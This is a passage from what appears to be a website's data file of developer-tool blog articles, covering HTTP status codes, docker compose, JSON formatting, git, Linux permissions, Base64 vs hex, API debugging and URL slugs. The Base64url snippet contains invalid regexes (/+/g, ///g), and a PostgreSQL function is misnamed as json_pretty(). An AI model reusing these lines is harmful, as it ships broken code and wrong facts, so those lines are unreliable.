- Returning 200 with error details in the body ("200 OK" with {error: "User not found"})
- Using 403 for unauthenticated requests (should be 401)
- Using 500 for client validation errors (should be 400/422)
- Always returning 200 regardless of result

## Authentication vs. Authorization Confusion

**401 Unauthorized** is poorly named — it actually means "unauthenticated":
- You haven't proven who you are
- Sends WWW-Authenticate header indicating how to authenticate

**403 Forbidden** means "unauthorized" — you're identified but not allowed:
- Server knows who you are
- Your permissions don't include this resource

## Caching and Status Codes

Status codes affect HTTP caching behavior:
- **200**: Cacheable by default (with appropriate headers)
- **301**: Cached indefinitely by browsers
- **302**: Generally not cached
- **404**: Can be cached (configurable)
- **5xx**: Generally not cached

## Using the HTTP Status Codes Reference

Our tool provides:
1. **All status codes** organized by category with names and descriptions
2. **Common usage examples** for each code
3. **Search** — find codes by number or keyword
4. **RFC references** — link to official specifications
5. **Copy code** — quickly copy the status code number for use in code

Keep it handy as a reference when designing APIs, debugging HTTP responses, and understanding web server behavior.`,
  },
  {
    slug: 'docker-compose-converter-guide',
    toolPath: '/docker-run-to-docker-compose-converter',
    title: 'Convert docker run to docker-compose: A Practical Guide',
    description: 'Convert docker run commands to docker-compose.yml. Understand volumes, ports, environment variables.',
    keywords: ["docker run to compose","docker-compose converter","docker compose yml","docker migration"],
    category: 'Development',
    publishedAt: '2025-07-10',
    content: `## What Is Docker Compose?

Docker Compose is a tool for defining and running multi-container Docker applications. Using a YAML configuration file (docker-compose.yml), you can configure all your application's services, networks, and volumes in one place, then start everything with a single command: \`docker compose up\`.

## docker run vs. docker-compose.yml

When working with Docker, you often start by building commands manually using \`docker run\`. As applications grow more complex, these commands become unwieldy. Docker Compose provides a declarative alternative.

### The docker run Command
\`\`\`bash
docker run -d \\
  --name postgres \\
  -e POSTGRES_USER=myuser \\
  -e POSTGRES_PASSWORD=mypassword \\
  -e POSTGRES_DB=mydb \\
  -p 5432:5432 \\
  -v postgres_data:/var/lib/postgresql/data \\
  --restart unless-stopped \\
  postgres:15
\`\`\`

### The Equivalent docker-compose.yml
\`\`\`yaml
version: '3.8'
services:
  postgres:
    image: postgres:15
    container_name: postgres
    environment:
      POSTGRES_USER: myuser
      POSTGRES_PASSWORD: mypassword
      POSTGRES_DB: mydb
    ports:
      - "5432:5432"
    volumes:
      - postgres_data:/var/lib/postgresql/data
    restart: unless-stopped

volumes:
  postgres_data:
\`\`\`

## Key Docker Compose Concepts

### Services
Each container in your application is defined as a service. Services can depend on each other, share networks, and communicate by service name.

### Networks
By default, Compose creates a single network for your app. All services can communicate using service names as hostnames. You can define multiple networks to isolate services.

### Volumes
Named volumes persist data beyond container lifecycle. Bind mounts map host directories into containers for development.

### Environment Variables
Can be defined inline, loaded from .env files, or passed through the host environment.

## Multi-Service Application Example

A full web application stack:
\`\`\`yaml
version: '3.8'

services:
  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
    depends_on:
      - app

  app:
    build: .
    environment:
      DATABASE_URL: postgresql://user:pass@db:5432/mydb
      REDIS_URL: redis://redis:6379
    depends_on:
      - db
      - redis

  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: pass
    volumes:
      - db_data:/var/lib/postgresql/data

  redis:
    image: redis:7-alpine

volumes:
  db_data:
\`\`\`

## Common docker run Flags and Their Compose Equivalents

| docker run flag | Compose key |
|----------------|-------------|
| -d | (background by default) |
| --name | container_name |
| -e VAR=val | environment: VAR: val |
| -p 80:80 | ports: - "80:80" |
| -v vol:/path | volumes: - vol:/path |
| --restart | restart: unless-stopped |
| --network | networks: |
| --link | depends_on: (use service names instead) |

## Docker Compose Commands

\`\`\`bash
docker compose up -d          # Start all services in background
docker compose down           # Stop and remove containers
docker compose logs -f        # Follow service logs
docker compose ps             # List running services
docker compose exec app bash  # Shell into a service
docker compose build          # Rebuild service images
docker compose pull           # Pull latest images
\`\`\`

## Using the Docker Run to Compose Converter

Our tool:
1. **Paste a docker run command** — handles all common flags
2. **Generate docker-compose.yml** — proper YAML structure
3. **Multi-command support** — convert multiple run commands to a complete compose file
4. **Network inference** — suggests network configurations based on linked containers
5. **Copy YAML** — ready to save as docker-compose.yml

Use it when migrating from manual Docker commands to a managed Compose workflow, documenting existing container configurations, or sharing service configurations with teammates.`,
  },
  {
    slug: 'json-formatter-guide',
    toolPath: '/json-format',
    title: 'How to Format and Validate JSON: A Developer\'s Guide',
    description: 'Learn to format, validate, and debug JSON. Understand common JSON errors and best practices.',
    keywords: ["JSON formatter","JSON validator","format JSON online","JSON pretty print","JSON syntax error"],
    category: 'Development',
    publishedAt: '2025-07-08',
    content: `## What Is JSON Formatting?

JSON formatting transforms minified or poorly structured JSON into a human-readable form with proper indentation, line breaks, and consistent spacing. While computers work equally well with compact or formatted JSON, humans find indented JSON far easier to read and understand.

## Why JSON Needs Formatting

JSON from APIs, database queries, and log files often arrives minified or with inconsistent formatting:

**Minified (machine-readable, hard for humans):**
\`\`\`
{"user":{"id":1,"name":"Alice","roles":["admin","editor"],"settings":{"theme":"dark","notifications":true}}}
\`\`\`

**Formatted (human-readable):**
\`\`\`json
{
  "user": {
    "id": 1,
    "name": "Alice",
    "roles": [
      "admin",
      "editor"
    ],
    "settings": {
      "theme": "dark",
      "notifications": true
    }
  }
}
\`\`\`

## JSON Formatting Options

### Indentation
- **2 spaces**: Most common for web projects (default in many formatters)
- **4 spaces**: Common in Python and some style guides
- **Tabs**: Consistent physical width, but renders differently in different editors

### Key Sorting
Sorting object keys alphabetically makes large JSON objects easier to navigate and produces stable diffs in version control.

### Array Formatting
Arrays can be formatted with one item per line (better readability) or compact (better for short arrays). Smart formatters apply different rules based on array content and length.

## JSON Validation

Formatting tools also validate JSON syntax. Common JSON errors:
- **Trailing commas**: JSON does not allow commas after the last array/object element (unlike JavaScript)
- **Unquoted keys**: JSON requires keys to be quoted with double quotes
- **Single quotes**: JSON uses double quotes only, not single quotes
- **Comments**: Standard JSON does not support comments (JSON5 and JSONC do)
- **Undefined/NaN/Infinity**: These JavaScript values are not valid JSON

## JSON in Different Contexts

### Configuration Files
Most configuration files (package.json, tsconfig.json, .eslintrc.json) use 2-space indentation by convention. Version-controlling these files benefits from consistent formatting for readable diffs.

### API Responses
APIs typically serve minified JSON over HTTP. Formatting is applied by developer tools (browser devtools, Postman, Insomnia) for display.

### Logs
Structured JSON logging produces minified output. Log analysis tools like Kibana, Splunk, and Datadog parse the raw JSON and format it for display.

### Database Storage
PostgreSQL's JSONB type stores JSON internally as binary. The \`json_pretty()\` function formats it for display when querying.

## JSON Schema

JSON Schema is a vocabulary for annotating and validating JSON documents:
\`\`\`json
{
  "$schema": "http://json-schema.org/draft-07/schema",
  "type": "object",
  "required": ["name", "email"],
  "properties": {
    "name": {"type": "string", "minLength": 1},
    "email": {"type": "string", "format": "email"},
    "age": {"type": "integer", "minimum": 0}
  }
}
\`\`\`

Validators check JSON data against schemas, catching structure and type errors before they reach application code.

## Using the JSON Formatter Tool

Our tool:
1. **Paste JSON data** — accepts minified, partially-formatted, or malformed input
2. **Instant formatting** — applies consistent indentation and line breaks
3. **Syntax validation** — reports errors with line numbers for easy fixing
4. **Sort keys** — optionally alphabetize object properties
5. **Multiple indent options** — 2 spaces, 4 spaces, or tabs
6. **Minify toggle** — switch between formatted and compact views
7. **Copy formatted JSON** — one-click clipboard copy

Use it for reading API responses, debugging JSON data, formatting configuration files, and validating JSON syntax before using it in applications.`,
  },
  {
    slug: 'git-cheat-sheet',
    toolPath: '/git-memo',
    title: 'Git Command Cheat Sheet: The Most Useful Commands Explained',
    description: 'A comprehensive Git reference covering everyday commands, branching, undo operations, and advanced workflows.',
    keywords: ["git cheat sheet","git commands","git memo","git reference","git workflow"],
    category: 'Development',
    publishedAt: '2025-07-12',
    content: `## Git: The Essential Version Control System

Git is the world's most widely used distributed version control system, created by Linus Torvalds in 2005 for Linux kernel development. Understanding Git's core commands and concepts is essential for every developer.

## Core Git Concepts

### Repository (Repo)
A Git repository is a directory that Git tracks. It contains all project files plus a hidden .git folder with the full version history.

### Working Tree, Staging Area, and Repository
Git has three areas where file changes live:
1. **Working tree**: Your actual files on disk
2. **Staging area (index)**: Files marked for the next commit
3. **Repository**: Committed history stored in .git

### Branches
A branch is a lightweight pointer to a specific commit. The default branch is usually called \`main\` (formerly \`master\`). Branching enables parallel development without affecting the main codebase.

### Commits
A commit is a snapshot of staged files at a point in time. Each commit has a unique SHA-1 hash, author, timestamp, and message.

## Essential Git Commands

### Setup
\`\`\`bash
git config --global user.name "Your Name"
git config --global user.email "you@example.com"
git init                    # Initialize new repo
git clone <url>             # Clone existing repo
\`\`\`

### Daily Workflow
\`\`\`bash
git status                  # Check file status
git add .                   # Stage all changes
git add <file>              # Stage specific file
git commit -m "message"     # Commit with message
git push origin main        # Push to remote
git pull                    # Fetch and merge from remote
\`\`\`

### Branching
\`\`\`bash
git branch                  # List branches
git branch feature-name     # Create branch
git checkout feature-name   # Switch to branch
git checkout -b new-branch  # Create and switch
git merge feature-branch    # Merge into current
git branch -d feature-name  # Delete branch
\`\`\`

### History and Diffs
\`\`\`bash
git log --oneline           # Compact log
git log --graph --all       # Visual branch graph
git diff                    # Unstaged changes
git diff --staged           # Staged changes
git show <commit>           # Show commit details
\`\`\`

### Undoing Changes
\`\`\`bash
git restore <file>          # Discard working tree changes
git restore --staged <file> # Unstage file
git revert <commit>         # Create undo commit
git reset --soft HEAD~1     # Undo last commit, keep changes staged
git reset --hard HEAD~1     # Undo last commit, discard changes
\`\`\`

### Remote Operations
\`\`\`bash
git remote add origin <url>    # Add remote
git remote -v                  # List remotes
git fetch origin               # Download without merging
git push --set-upstream origin main  # First push
git pull --rebase              # Rebase instead of merge
\`\`\`

### Stashing
\`\`\`bash
git stash                   # Save uncommitted work
git stash list              # View saved stashes
git stash pop               # Apply and remove latest stash
git stash apply stash@{1}   # Apply specific stash
\`\`\`

## Git Workflow Strategies

### Feature Branch Workflow
Create a branch for each feature or bug fix:
1. \`git checkout -b feature/new-feature\`
2. Make commits
3. Open pull request
4. Review and merge to main

### Gitflow
More structured workflow with main, develop, feature, release, and hotfix branches. Suited for projects with scheduled releases.

### Trunk-Based Development
Short-lived feature branches merged to main frequently. Works well with CI/CD and feature flags.

## Useful Git Aliases

\`\`\`bash
git config --global alias.st status
git config --global alias.co checkout
git config --global alias.lg "log --oneline --graph --all"
\`\`\`

## Using the Git Memo Reference

Our Git memo tool provides an interactive reference for:
1. All common Git commands organized by category
2. Quick-reference cheat sheet for daily operations
3. Workflow diagrams for branching strategies
4. Explanation of Git concepts for beginners
5. Advanced commands for rebasing, cherry-picking, and bisecting

Keep it open while working for quick command lookups without leaving your terminal.`,
  },

  // ─── New SEO/GEO Articles (2026-05) ────────────────────────────────────────
  {
    slug: 'linux-file-permissions-chmod-guide',
    toolPath: '/chmod-calculator',
    title: 'Linux File Permissions Explained: chmod, chown, and Octal Notation',
    description: 'Understand Linux file permissions from scratch. Learn what rwx means, how octal notation works, and when to use chmod 755 vs 644 vs 777.',
    keywords: ['linux file permissions', 'chmod', 'chmod 755', 'chmod 644', 'octal permissions', 'rwx linux', 'file permission calculator'],
    category: 'Development',
    publishedAt: '2026-05-15',
    content: `## Why File Permissions Matter

Every file and directory on a Linux system has an owner and a set of rules controlling who can read, write, or execute it. Get these wrong and you either lock yourself out of your own files or — far worse — leave sensitive data readable by any user on the system.

This guide explains the permission system from first principles, so you stop guessing and start understanding what your \`ls -la\` output actually means.

## Reading the Permission String

Run \`ls -la\` in any directory and you will see something like this:

\`\`\`
-rwxr-xr--  1 alice devs  4096 May 10 09:30 deploy.sh
drwxr-x---  2 alice devs  4096 May  8 14:22 config/
\`\`\`

The first column is a 10-character string. Break it down:

| Position | Characters | Meaning |
|----------|-----------|---------|
| 1 | - or d | File type: - = regular file, d = directory |
| 2-4 | rwx | Owner permissions |
| 5-7 | r-x | Group permissions |
| 8-10 | r-- | Others (world) permissions |

Each triplet uses three flags:
- **r** (read, value 4) — view file contents or list directory
- **w** (write, value 2) — modify file or add/remove files in directory
- **x** (execute, value 1) — run file as program, or cd into directory
- **-** — permission not granted

So \`rwxr-xr--\` means: owner can read/write/execute; group can read/execute; others can only read.

## Octal Notation: The Numbers Behind chmod

Each permission triplet maps to a number from 0 to 7 by adding the values of granted permissions:

| Octal | Binary | Permissions |
|-------|--------|-------------|
| 7 | 111 | rwx |
| 6 | 110 | rw- |
| 5 | 101 | r-x |
| 4 | 100 | r-- |
| 3 | 011 | -wx |
| 2 | 010 | -w- |
| 1 | 001 | --x |
| 0 | 000 | --- |

Three octal digits cover owner, group, and others in that order. So \`chmod 754 file\` sets owner to rwx (7), group to r-x (5), others to r-- (4).

## The Most Common Permission Modes

**chmod 644** — Standard web file. Owner reads and writes; everyone else reads only. Used for HTML, CSS, config files, anything a web server needs to read but not execute.

**chmod 755** — Executable script or public directory. Owner has full control; group and others can read and execute but not modify. Use this for shell scripts, binaries, and public directories.

**chmod 700** — Private files. Only the owner has any access at all. Use for SSH keys, credential files, and private scripts.

**chmod 600** — Sensitive data, no execute needed. SSH private key files must be 600 or SSH will refuse to use them.

**chmod 777** — Avoid unless you know exactly why. Anyone on the system can read, write, and execute. Almost never the right choice on a shared or production server.

## Symbolic Mode: Letters Instead of Numbers

chmod also accepts a symbolic syntax that is easier to read for targeted changes:

\`\`\`bash
chmod u+x script.sh      # add execute for owner
chmod g-w file.txt       # remove write from group
chmod o=r file.txt       # set others to read-only exactly
chmod a+r file.txt       # add read for all (a = all)
chmod ug+rw,o-rwx data/  # owner+group read/write, others nothing
\`\`\`

The letters: u = user (owner), g = group, o = others, a = all three. Operators: + adds, - removes, = sets exactly.

## Directories vs Files: A Key Difference

Execute permission means something different on directories. Without x on a directory, you cannot cd into it or access anything inside, even if you have read permission. This is why directories need 755 while their contents can be 644.

\`\`\`bash
# Wrong: breaks directory traversal
chmod -R 644 /var/www/html/

# Correct: X (capital) applies execute only to directories
chmod -R u=rwX,go=rX /var/www/html/
\`\`\`

## chown: Changing Ownership

\`\`\`bash
chown alice file.txt           # change owner
chown alice:devs file.txt      # change owner and group
chown -R www-data /var/www/    # recursive, common for web servers
\`\`\`

## Special Permission Bits

**setuid (4000)** — Executable runs as the file owner, not the caller. The \`passwd\` command uses this.

**setgid (2000)** — New files in a directory inherit the directory group. Useful for shared project folders.

**sticky bit (1000)** — On directories like \`/tmp\`, prevents users from deleting files they do not own.

\`\`\`bash
chmod 4755 /usr/local/bin/mytool  # setuid + 755
chmod 2775 /shared/project/       # setgid + 775
chmod 1777 /tmp                   # sticky + full write
\`\`\`

## Web Server Permissions Reference

| Location | Owner | Permissions |
|----------|-------|-------------|
| Application files | deploy user | 644 |
| Application directories | deploy user | 755 |
| Shell scripts / binaries | deploy user | 755 |
| Uploaded content | www-data | 644 |
| Upload directory | www-data | 755 |
| .env / credential files | deploy user | 600 |
| SSH private keys | user | 600 |

→ Try the [chmod Calculator](/chmod-calculator) to convert between octal, symbolic, and readable formats instantly.`,
  },
  {
    slug: 'base64-vs-hex-encoding',
    toolPath: '/base64-string-converter',
    title: 'Base64 vs Hex Encoding: Differences, Use Cases, and When to Use Each',
    description: 'Base64 and hex are both ways to represent binary data as text, but they work differently and suit different situations. Here is when to use which.',
    keywords: ['base64 vs hex', 'base64 encoding', 'hex encoding', 'binary to text', 'base64 decode', 'hex decode', 'encoding comparison'],
    category: 'Converter',
    publishedAt: '2026-05-16',
    content: `## The Problem They Both Solve

Computers store everything as binary — sequences of bytes with values from 0 to 255. When you need to transmit or store binary data in a system that only handles printable text (an email body, a JSON field, a URL parameter, a cookie), you have to encode it first.

Base64 and hexadecimal are the two most common solutions. They solve the same problem but make different tradeoffs.

## How Hex Encoding Works

Hexadecimal uses 16 characters: 0-9 and a-f. Each byte (0-255) maps to exactly two hex characters, because 256 equals 16 squared.

\`\`\`
"Hi"  →  bytes: 72, 105  →  hex: 48 69  →  "4869"
\`\`\`

Size overhead: every byte becomes 2 characters, so hex-encoded data is exactly **2x the size** of the original.

The character set [0-9a-f] is safe in virtually every context — URLs, filenames, terminal output, database fields, log files.

## How Base64 Encoding Works

Base64 uses 64 characters: A-Z, a-z, 0-9, plus + and / (with = for padding). Every 3 bytes of input map to 4 Base64 characters.

\`\`\`
"Hi!"  →  bytes: 72, 105, 33  →  base64: "SGkh"
\`\`\`

Size overhead: 3 bytes become 4 characters, so Base64 is roughly **33% larger** than the original (compared to 100% overhead for hex). For large payloads like images or files, this difference is meaningful.

## Side-by-Side Comparison

| Property | Hex | Base64 |
|----------|-----|--------|
| Characters used | 0-9, a-f (16 chars) | A-Z, a-z, 0-9, +, / (64 chars) |
| Size overhead | +100% (2x original) | +33% (roughly 4/3 original) |
| Human readability | Byte values visible | Not readable |
| URL-safe by default | Yes | No (+ and / need escaping) |
| URL-safe variant | — | Base64url: uses - and _ |
| Common use cases | Checksums, hashes, colors | Images, files, JWT, email |

## When to Use Hex

**Checksums and hashes** — SHA-256, MD5, and most hash functions output hex by convention. Running sha256sum gives you a 64-character hex string. The format is readable enough to compare the first 8 characters visually.

**Color codes** — CSS colors like #ff6600 are hex: R=ff (255), G=66 (102), B=00 (0).

**Binary protocol debugging** — When inspecting raw network packets or file headers, hex shows exact byte values. Tools like xxd, hexdump, and Wireshark all default to hex.

**Database IDs and tokens** — Many systems store UUIDs as 32-character hex strings. Hex is compact and URL-safe with no escaping required.

\`\`\`javascript
// Node.js: hash as hex
const hash = crypto.createHash('sha256').update(data).digest('hex');

// Node.js: random token as hex
const token = crypto.randomBytes(32).toString('hex'); // 64 chars
\`\`\`

## When to Use Base64

**Embedding binary in text formats** — JSON has no binary type. Storing an image, certificate, or file inside a JSON field requires Base64. The lower size overhead matters for large payloads.

**Email attachments** — MIME encoding for email attachments has used Base64 since the early 1990s.

**JWTs (JSON Web Tokens)** — JWT headers and payloads are Base64url-encoded. You can decode a JWT by splitting on . and Base64-decoding each part — no secret key needed to read the claims.

**Data URIs** — Embedding images directly in CSS or HTML uses Base64: data:image/png;base64,iVBOR...

**TLS certificates** — PEM format (the -----BEGIN CERTIFICATE----- format) is Base64-encoded DER data.

\`\`\`javascript
// Node.js: encode to Base64
const encoded = Buffer.from(binaryData).toString('base64');

// URL-safe Base64 for JWTs and URLs
const urlSafe = encoded.replace(/+/g, '-').replace(///g, '_').replace(/=/g, '');
\`\`\`

## URL Safety: A Practical Concern

Standard Base64 uses + and /, both of which have special meaning in URLs (+ means space; / is a path separator). If you need Base64 in a URL query parameter, either percent-encode it or switch to the Base64url variant (RFC 4648): replace + with -, / with _, and strip = padding.

Hex has no such issue — the characters 0-9a-f are URL-safe in every context.

## Quick Decision Guide

- Representing a **hash or checksum**? → **Hex**
- **Embedding a file or image** in JSON, HTML, or email? → **Base64**
- Building a **JWT or OAuth token**? → **Base64url**
- Debugging **binary data** at the byte level? → **Hex**
- Storing **random bytes as a token** in a URL? → **Hex** (simpler) or **Base64url** (shorter)
- **CSS color codes**? → **Hex** (the universal standard)

→ Try the [Base64 String Converter](/base64-string-converter) to encode and decode instantly, or the [Hash Text Tool](/hash-text) for hex-encoded hashes.`,
  },
  {
    slug: 'how-to-debug-api-requests',
    toolPath: '/url-parser',
    title: 'How to Debug API Requests: A Practical Guide for Developers',
    description: 'Walk through a systematic approach to debugging failed API calls — from reading HTTP status codes and parsing URLs to inspecting headers and decoding JWT tokens.',
    keywords: ['debug API requests', 'API debugging', 'HTTP debugging', 'API error troubleshooting', '401 unauthorized fix', '400 bad request', 'CORS error fix'],
    category: 'Web',
    publishedAt: '2026-05-17',
    content: `## APIs Fail in Predictable Ways

When an API call fails, most developers immediately open the network tab or start adding console.log statements. That works, but there is a faster mental model: every API failure falls into one of five categories, and the HTTP status code tells you which one. Once you know the category, the fix is usually obvious.

## Step 1: Read the Status Code

The status code is the single most important diagnostic signal. Never skip it.

**4xx — You sent something wrong**

| Code | Meaning | Most Common Cause |
|------|---------|-------------------|
| 400 | Bad Request | Malformed JSON, wrong field type, missing required field |
| 401 | Unauthorized | Missing or expired token, wrong auth scheme |
| 403 | Forbidden | Valid token but insufficient permissions |
| 404 | Not Found | Wrong URL path, resource does not exist, wrong ID |
| 405 | Method Not Allowed | POST where GET is expected, or vice versa |
| 409 | Conflict | Duplicate record, stale update, race condition |
| 413 | Payload Too Large | File too big, body exceeds server limit |
| 422 | Unprocessable Entity | Valid JSON structure but invalid field values |
| 429 | Too Many Requests | Rate limited — back off and retry |

**5xx — The server broke**

| Code | Meaning | Action |
|------|---------|--------|
| 500 | Internal Server Error | Bug on their side; check their status page |
| 502 | Bad Gateway | Server down or restarting |
| 503 | Service Unavailable | Overload or maintenance |
| 504 | Gateway Timeout | Server too slow; retry with backoff |

A 5xx is almost never your fault. Check the service status page before debugging your own code.

## Step 2: Inspect the URL

More API bugs trace back to malformed URLs than developers expect. Check these systematically:

**Protocol** — http vs https. Many APIs refuse plain HTTP connections or silently redirect them.

**Host** — A single typo connects you to the wrong server or nowhere at all.

**Path** — Watch for a missing leading slash, a doubled slash, or the wrong version prefix (v1 vs v2).

**Query parameters** — Values must be URL-encoded. A space must become %20; an ampersand in a value must become %26. Always use encodeURIComponent() in JavaScript when building URLs dynamically.

\`\`\`javascript
// Wrong — breaks if name contains &, =, or spaces
const url = \`https://api.example.com/search?name=\${name}\`;

// Correct
const url = \`https://api.example.com/search?name=\${encodeURIComponent(name)}\`;
\`\`\`

## Step 3: Check Authentication

The difference between 401 and 403 is important:
- **401** — The server does not know who you are. Credentials are missing, expired, or malformed.
- **403** — The server knows who you are but will not permit the action. This is a permissions issue.

For JWT Bearer tokens, decode the token and check the exp claim (expiry as a Unix timestamp), the aud claim (intended audience), and any scope or permissions claims. You do not need the signing secret to read the claims — only to verify the signature.

For API keys, verify the key is in the correct header and confirm you are using the key for the right environment. Production keys typically do not work on staging endpoints.

For Basic Auth, the header value is base64(username:password). Decode it to confirm the credentials are correct.

## Step 4: Validate the Request Body

400 and 422 errors usually mean something is wrong with the request body. Read the error response carefully — it typically identifies the specific field that failed.

Common body problems:

**Wrong Content-Type** — Sending JSON without the Content-Type: application/json header causes some servers to ignore the body entirely.

**Trailing commas** — Valid in JavaScript but invalid in JSON. The value {"key": "value",} will fail JSON parsing on most servers.

**Wrong types** — Sending the string "123" where an integer 123 is required, or "true" where a boolean true is expected.

**Null versus missing** — Some APIs treat an explicit null differently from an omitted field.

## Step 5: Diagnose CORS Errors

CORS errors occur only in browsers. The same request may succeed from curl or Postman but fail in your web app, because browsers enforce same-origin policy and require servers to explicitly permit cross-origin requests.

Signs of a CORS problem: the browser console shows "Access to fetch has been blocked by CORS policy," the network tab shows a status of 0, and the request works fine from Postman.

The fix must happen on the server. CORS cannot be disabled from the browser. Check whether the server responds with Access-Control-Allow-Origin set to your origin or *, and whether it handles the preflight OPTIONS request for routes that require an Authorization header.

## Step 6: Isolate with curl

Use curl to remove all client-side variables. If a request works in curl but not in your code, the bug is in your code. If it works in curl but not in the browser, it is CORS.

\`\`\`bash
# GET with auth header
curl -v -H "Authorization: Bearer your_token" https://api.example.com/users

# POST with JSON body
curl -v -X POST \\
  -H "Content-Type: application/json" \\
  -H "Authorization: Bearer your_token" \\
  -d '{"name":"test","email":"test@example.com"}' \\
  https://api.example.com/users
\`\`\`

The -v flag shows full request and response headers. Always include it when debugging — most bugs hide in the headers.

## Debugging Toolkit

| Problem | Tool |
|---------|------|
| Parse and break down a URL | [URL Parser](/url-parser) |
| Decode and inspect a JWT | [JWT Parser](/jwt-parser) |
| Decode a Base64 auth header | [Base64 Decoder](/base64-string-converter) |
| Look up an HTTP status code | [HTTP Status Codes](/http-status-codes) |
| Test regex against response data | [Regex Tester](/regex-tester) |

→ Start with the [URL Parser](/url-parser) to break down any endpoint URL and catch encoding or path mistakes immediately.`,
  },

  // ─── SEO/GEO Batch 2 (2026-05) ─────────────────────────────────────────────
  {
    slug: 'what-is-a-slug-url-guide',
    toolPath: '/slugify-string',
    title: 'What Is a URL Slug? How Slugs Work and Why They Matter for SEO',
    description: 'Learn what a slug is in web development, how slugification works, why slugs matter for SEO, and the rules for creating clean, durable URL slugs.',
    keywords: ['url slug', 'what is a slug', 'slugify', 'seo url', 'url friendly string', 'slug generator'],
    category: 'Web',
    publishedAt: '2026-05-19',
    content: `## What Is a Slug?

A slug is the part of a URL that identifies a specific page in a human-readable, URL-friendly format. It comes after the domain and any path prefixes, and it represents the content's title or subject converted into a form that works safely in a web address.

For a blog post titled "How to Bake Sourdough Bread at Home", the slug would look like this:

\`\`\`
https://example.com/blog/how-to-bake-sourdough-bread-at-home
\`\`\`

The slug is: \`how-to-bake-sourdough-bread-at-home\`

## Why Not Just Use the Title Directly?

Raw titles cause several problems in URLs:

**Spaces** — URLs cannot contain spaces. Browsers encode them as \`%20\` or \`+\`, producing ugly URLs like \`how%20to%20bake%20sourdough%20bread\`.

**Special characters** — Punctuation like apostrophes, commas, and question marks must be percent-encoded, making URLs unreadable and hard to copy.

**Uppercase letters** — URLs are technically case-sensitive. \`/About\` and \`/about\` can be treated as different pages by some servers, causing duplicate content issues.

**Non-ASCII characters** — Accented letters, Chinese characters, Arabic script, and emoji all require percent-encoding in URLs. A title like "Über uns" becomes \`%C3%9Cber%20uns\`.

A slug solves all of these by normalizing the text before it goes into the URL.

## How Slugification Works

Converting a string to a slug follows a consistent set of steps:

1. **Lowercase everything** — \`Hello World\` → \`hello world\`
2. **Normalize unicode** — \`Ü\` → \`u\`, \`é\` → \`e\`, \`ñ\` → \`n\`
3. **Replace spaces with hyphens** — \`hello world\` → \`hello-world\`
4. **Remove characters that are not alphanumeric or hyphens** — apostrophes, quotes, slashes, etc.
5. **Collapse multiple hyphens** — \`hello--world\` → \`hello-world\`
6. **Trim leading and trailing hyphens** — \`-hello-world-\` → \`hello-world\`

\`\`\`javascript
// Simple slug function in JavaScript
function slugify(text) {
  return text
    .toString()
    .normalize('NFKD')               // split accented chars
    .replace(/[\\u0300-\\u036f]/g, '')  // remove accent marks
    .toLowerCase()
    .trim()
    .replace(/[^a-z0-9 -]/g, '')     // remove non-alphanumeric
    .replace(/\\s+/g, '-')            // spaces to hyphens
    .replace(/-+/g, '-')             // collapse multiple hyphens
}

slugify('Hello, World! It\\'s a test.')  // → 'hello-world-its-a-test'
slugify('Ünternehmens-Bericht 2024')    // → 'unternehmens-bericht-2024'
\`\`\`

Most frameworks (Django, Rails, Laravel, Next.js) include a slugify utility or an equivalent. You rarely need to write this from scratch.

## Slugs and SEO

Slugs have a direct impact on search engine rankings. Here is why:

**Keywords in the URL** — Search engines read URL paths as ranking signals. A URL containing the exact phrase users search for carries more weight than a generic ID like \`/posts/12345\`.

**Readability signals click-through rate** — Users in search results are more likely to click a URL they can read and understand. A slug that mirrors the page title reassures the user they are going to the right place.

**Link sharing** — When someone pastes a URL into a chat or tweet, a meaningful slug communicates the topic without the user needing to click.

**Canonicalization** — If you have multiple URLs that could point to the same content (with trailing slash, without, with query string), a consistent slug structure makes canonical tags and redirects simpler to manage.

## Slug Design Rules

**Use hyphens, not underscores** — Google treats hyphens as word separators. Underscores join words together, so \`my_page\` is read as one word \`mypage\`, while \`my-page\` is read as two words. Use hyphens.

**Keep slugs short but descriptive** — Aim for 3 to 5 meaningful words. \`how-to-format-json-online\` is better than both the full title and a bare \`json\`.

**Avoid stop words when possible** — Words like "a", "an", "the", "and", "of" add length without keyword value. \`python-list-comprehension-guide\` outperforms \`a-guide-to-list-comprehensions-in-python\`.

**Never change a slug once it is live** — Every slug change breaks existing links, loses backlink equity, and creates 404 errors unless you set up permanent redirects. Plan your slug structure before publishing.

**Avoid dates in slugs unless necessary** — Dates make content feel stale and require redirects when you update the article. \`javascript-async-await-guide\` ages better than \`javascript-async-await-guide-2023\`.

## Slugs in Different Platforms

| Platform | Slug behavior |
|----------|--------------|
| WordPress | Auto-generated from title, editable before publish |
| Shopify | Auto-generated for products and collections |
| Next.js / Nuxt | File-based routing: the filename is the slug |
| Django | SlugField + prepopulate_fields in admin |
| Rails | \`FriendlyId\` gem or custom \`to_param\` |

## Common Mistakes

**Using the article ID as the slug** — URLs like \`/blog/4839\` tell search engines nothing about the content. If you must include an ID, append the readable slug: \`/blog/4839-how-to-format-json\`.

**Duplicate slugs** — Two posts with the same slug cause one to overwrite the other or return a 500 error. Always check for uniqueness before saving.

**Changing slugs without redirects** — A changed slug with no 301 redirect creates a 404 and orphans any inbound links. If you must change a slug, set up a permanent redirect immediately.

**Overly long slugs** — Slugs longer than about 60 characters get truncated in search results and are hard to remember. Cut aggressively.

→ Use the [Slugify String Tool](/slugify-string) to convert any title into a clean, URL-safe slug instantly.`,
  },
  {
    slug: 'xml-vs-json-vs-yaml',
    toolPath: '/json-to-yaml-converter',
    title: 'XML vs JSON vs YAML: Which Data Format Should You Use?',
    description: 'A practical comparison of XML, JSON, and YAML — covering syntax, use cases, strengths, and when to choose each format for APIs, config files, and data storage.',
    keywords: ['xml vs json', 'json vs yaml', 'xml vs yaml', 'data formats comparison', 'when to use json', 'yaml vs json config'],
    category: 'Development',
    publishedAt: '2026-05-20',
    content: `## Three Formats, One Purpose

XML, JSON, and YAML all represent the same thing: structured data as text. They can all express objects (key-value pairs), arrays, strings, numbers, booleans, and null values. The difference is in syntax, verbosity, and the problems each format was designed to solve.

Knowing when to use each one saves time and prevents the kind of architectural decisions that cause pain years later.

## XML: The Verbose Veteran

XML (eXtensible Markup Language) was standardized in 1998. It uses opening and closing tags like HTML:

\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<person>
  <name>Alice</name>
  <age>30</age>
  <active>true</active>
  <roles>
    <role>admin</role>
    <role>editor</role>
  </roles>
</person>
\`\`\`

**What XML does well:**
- Attributes on elements (metadata separate from content)
